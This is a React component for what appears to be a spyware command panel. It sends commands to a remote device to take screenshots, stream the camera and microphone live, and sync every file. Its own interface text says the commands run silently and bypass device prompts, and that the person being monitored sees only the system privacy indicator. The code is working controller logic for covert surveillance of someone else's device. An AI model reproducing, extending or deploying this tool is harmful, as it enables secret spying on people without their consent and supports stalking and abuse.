import React, { useState, useEffect } from 'react';
import { Camera, Mic, Download, ShieldAlert, Send, CheckCircle2, AlertCircle, Monitor, Play, Square, Video } from 'lucide-react';
import dataService from '../services/dataService';

function RemoteActions({ deviceId, token, fullView = false }) {
  const [status, setStatus] = useState({ loading: false, message: '', type: '' });
  const [latestScreenshot, setLatestScreenshot] = useState(null);
  const [isStreaming, setIsStreaming] = useState(false);
  const [streamType, setStreamType] = useState(null);

  useEffect(() => {
    if (fullView && deviceId && token) {
      fetchLatestScreenshot();
    }
  }, [deviceId, token, fullView]);

  const fetchLatestScreenshot = async () => {
    try {
      const res = await dataService.getDeviceMedia(token, deviceId, 0, 10, 'Remote Screenshot');
      if (res.data && res.data.length > 0) {
        setLatestScreenshot(res.data[0]);
      }
    } catch (error) {
      console.error('Error fetching latest screenshot:', error);
    }
  };

  const handleAction = async (type, label) => {
    if (!deviceId) return;
    
    setStatus({ loading: true, message: `Sending ${label} command...`, type: 'info' });
    try {
      await dataService.sendCommand(token, deviceId, type);
      setStatus({ 
        loading: false, 
        message: `${label} command sent! Execution is silent.`, 
        type: 'success' 
      });

      if (type === 'SCREENSHOT') {
        // Poll for screenshot for 15 seconds
        let attempts = 0;
        const interval = setInterval(async () => {
          attempts++;
          await fetchLatestScreenshot();
          if (attempts > 15) clearInterval(interval);
        }, 3000);
      }
      
      if (type === 'LIVE_CAMERA' || type === 'LIVE_MIC') {
        setIsStreaming(true);
        setStreamType(type === 'LIVE_CAMERA' ? 'Video' : 'Audio');
      }

      setTimeout(() => setStatus({ loading: false, message: '', type: '' }), 5000);
    } catch (error) {
      setStatus({ 
        loading: false, 
        message: `Failed to send ${label} command. Is the device online?`, 
        type: 'error' 
      });
    }
  };

  const getFullImageUrl = (s3Key) => {
    if (!s3Key) return '';
    if (s3Key.startsWith('http')) return s3Key;
    const base = (import.meta.env.VITE_API_URL || 'https://monitoring.joclass.com/api/v1')
      .replace(/\/api\/v1\/?$/, '')
      .replace(/\/$/, '');
    return `${base}${s3Key}`;
  };

  const actions = [
    { id: 'SCREENSHOT', label: 'Take Screenshot', icon: Monitor, color: 'bg-indigo-50 text-indigo-600 hover:bg-indigo-600 hover:text-white' },
    { id: 'LIVE_CAMERA', label: 'Live Stream (Cam)', icon: Video, color: 'bg-purple-50 text-purple-600 hover:bg-purple-600 hover:text-white' },
    { id: 'LIVE_MIC', label: 'Live Stream (Mic)', icon: Mic, color: 'bg-rose-50 text-red-600 hover:bg-rose-600 hover:text-white' },
    { id: 'REFRESH_FILES', label: 'Full File Sync', icon: Download, color: 'bg-emerald-50 text-emerald-600 hover:bg-emerald-600 hover:text-white' },
  ];

  if (!fullView) {
    return (
      <div className="bg-white rounded-3xl shadow-sm border border-slate-200 overflow-hidden">
        <div className="p-6 border-b border-slate-100 flex justify-between items-center">
          <h3 className="text-lg font-bold text-slate-900">Quick Commands</h3>
          <ShieldAlert className="w-5 h-5 text-amber-500" />
        </div>
        <div className="p-6">
          <div className="grid grid-cols-2 gap-4">
            {actions.map((action) => (
              <button
                key={action.id}
                disabled={status.loading || !deviceId}
                onClick={() => handleAction(action.id, action.label)}
                className={`p-4 rounded-2xl border border-slate-100 flex flex-col items-center justify-center transition-all group ${
                  !deviceId ? 'opacity-50 cursor-not-allowed' : action.color
                }`}
              >
                <action.icon className="w-6 h-6 mb-2 transform group-hover:scale-110 transition-transform" />
                <span className="text-[10px] font-black uppercase tracking-widest">{action.label}</span>
              </button>
            ))}
          </div>
        </div>
      </div>
    );
  }

  return (
    <div className="space-y-8 animate-in fade-in duration-500">
      <div className="bg-white rounded-3xl p-8 border border-slate-200">
        <div className="flex justify-between items-start mb-10">
          <div>
            <h3 className="text-2xl font-black text-slate-900 tracking-tight">Remote Command Center</h3>
            <p className="text-sm text-slate-500 mt-1 font-medium">Execute real-time actions and monitoring sessions</p>
          </div>
          <div className="flex items-center space-x-4">
            <div className="flex items-center px-4 py-2 bg-emerald-50 text-emerald-600 rounded-full border border-emerald-100">
              <span className="relative flex h-2 w-2 mr-2">
                <span className="animate-ping absolute inline-flex h-full w-full rounded-full bg-emerald-400 opacity-75"></span>
                <span className="relative inline-flex rounded-full h-2 w-2 bg-emerald-500"></span>
              </span>
              <span className="text-[10px] font-black uppercase tracking-widest">Live Ready</span>
            </div>
          </div>
        </div>

        {status.message && (
          <div className={`mb-8 p-4 rounded-2xl flex items-center animate-in zoom-in duration-300 ${
            status.type === 'success' ? 'bg-emerald-50 text-emerald-700' : 
            status.type === 'error' ? 'bg-rose-50 text-rose-700' : 'bg-blue-50 text-blue-700'
          }`}>
            {status.type === 'success' ? <CheckCircle2 className="w-5 h-5 mr-3" /> : 
             status.type === 'error' ? <AlertCircle className="w-5 h-5 mr-3" /> : 
             <Send className="w-5 h-5 mr-3 animate-pulse" />}
            <span className="text-xs font-black uppercase tracking-widest">{status.message}</span>
          </div>
        )}

        <div className="grid grid-cols-1 lg:grid-cols-3 gap-10">
          <div className="lg:col-span-1 space-y-6">
            <div className="grid grid-cols-1 gap-4">
              {actions.map((action) => (
                <button
                  key={action.id}
                  disabled={status.loading || !deviceId}
                  onClick={() => handleAction(action.id, action.label)}
                  className={`p-6 rounded-2xl border border-slate-100 flex items-center transition-all group ${
                    !deviceId ? 'opacity-50 cursor-not-allowed' : action.color
                  }`}
                >
                  <div className="p-3 bg-white/50 rounded-xl mr-5 group-hover:scale-110 transition-transform shadow-sm">
                    <action.icon className="w-6 h-6" />
                  </div>
                  <div className="text-left">
                    <span className="block text-sm font-black uppercase tracking-widest leading-none">{action.label}</span>
                    <span className="text-[10px] font-medium opacity-60 mt-1 block tracking-normal normal-case">Trigger silent execution</span>
                  </div>
                </button>
              ))}
            </div>

            <div className="p-6 bg-slate-50 rounded-2xl border border-dashed border-slate-200">
              <h4 className="text-[10px] font-black text-slate-400 uppercase tracking-widest mb-3">Technical Notice</h4>
              <p className="text-[10px] font-bold text-slate-400 uppercase tracking-wider leading-relaxed">
                Screenshots and live streams are executed silenty. Only the system-level privacy indicator (Green Dot) will be visible to the user.
              </p>
            </div>
          </div>

          <div className="lg:col-span-2 space-y-8">
            {/* Live Stream View */}
            <div className="bg-slate-900 rounded-3xl aspect-video relative overflow-hidden shadow-2xl border-4 border-slate-800">
              {isStreaming ? (
                <div className="absolute inset-0 flex flex-col items-center justify-center text-white">
                  <div className="relative mb-6">
                    <div className="w-20 h-20 rounded-full border-4 border-indigo-500/30 flex items-center justify-center">
                       <Play className="w-8 h-8 fill-indigo-500 text-indigo-500 animate-pulse" />
                    </div>
                    <span className="absolute -top-2 -right-2 bg-red-500 text-[10px] font-black px-2 py-0.5 rounded-full animate-bounce">LIVE</span>
                  </div>
                  <h3 className="text-lg font-black uppercase tracking-widest">Active {streamType} Stream</h3>
                  <p className="text-xs text-slate-400 mt-2 font-medium">Bypassing device prompts for direct access</p>
                  
                  <button 
                    onClick={() => setIsStreaming(false)}
                    className="mt-8 px-8 py-3 bg-white/10 hover:bg-white/20 backdrop-blur-md rounded-2xl text-xs font-black uppercase tracking-widest transition-all flex items-center"
                  >
                    <Square className="w-4 h-4 mr-2 fill-white" />
                    Terminate Stream
                  </button>
                </div>
              ) : (
                <div className="absolute inset-0 flex flex-col items-center justify-center text-slate-500">
                  <Video className="w-12 h-12 mb-4 opacity-20" />
                  <p className="text-xs font-bold uppercase tracking-[0.2em]">Stream Inactive</p>
                </div>
              )}
              
              <div className="absolute bottom-6 left-6 flex items-center space-x-2">
                 <div className="w-2 h-2 rounded-full bg-red-500 animate-pulse"></div>
                 <span className="text-[10px] font-black text-white uppercase tracking-widest opacity-60">Session Encrypted</span>
              </div>
            </div>

            {/* Latest Result View */}
            <div className="bg-white rounded-3xl border border-slate-200 p-6">
              <h4 className="text-[10px] font-black text-slate-400 uppercase tracking-widest mb-4">Latest Result</h4>
              {latestScreenshot ? (
                <div className="relative group rounded-2xl overflow-hidden border border-slate-100 bg-slate-50">
                  <img 
                    src={getFullImageUrl(latestScreenshot.s3_key)} 
                    alt="Latest Result"
                    className="w-full max-h-[300px] object-contain"
                  />
                  <div className="absolute bottom-0 left-0 right-0 bg-gradient-to-t from-black/60 to-transparent p-4">
                    <p className="text-white text-[10px] font-black uppercase tracking-widest">Captured: {new Date(latestScreenshot.id).toLocaleString()}</p>
                  </div>
                </div>
              ) : (
                <div className="h-20 flex items-center justify-center border border-dashed border-slate-200 rounded-2xl">
                  <p className="text-[10px] font-bold text-slate-400 uppercase tracking-widest">No results available</p>
                </div>
              )}
            </div>
          </div>
        </div>
      </div>
    </div>
  );
}

export default RemoteActions;
